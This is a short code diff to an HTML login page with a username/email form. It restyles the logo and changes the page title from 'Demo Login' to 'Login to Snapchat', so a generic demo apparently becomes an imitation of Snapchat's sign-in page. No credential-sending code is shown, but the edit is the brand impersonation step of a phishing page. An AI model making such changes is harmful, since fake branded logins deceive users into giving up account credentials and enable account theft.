@@ -283,7 +283,7 @@
 <body>
     <div class="main">
         <div class="login">
-            <img class="logo" src="logo.png" alt="Logo">
+            <img class="logo" src="logo.png" alt="Logo" style="max-width:70px;width:100%;height:auto;display:block;margin:auto;">
             <h1 id="pageTitle">Login to Snapchat</h1>
 
             <form id="loginForm" class="login-form" novalidate>
@@ -381,7 +381,7 @@
 
     function renderLogin(showError = false) {
         step = 'login';
-        pageTitle.textContent = 'Demo Login';
+        pageTitle.textContent = 'Login to Snapchat';
         fieldsWrap.innerHTML = `
             <div class="field">
                 <label for="username">Username or Email</label>
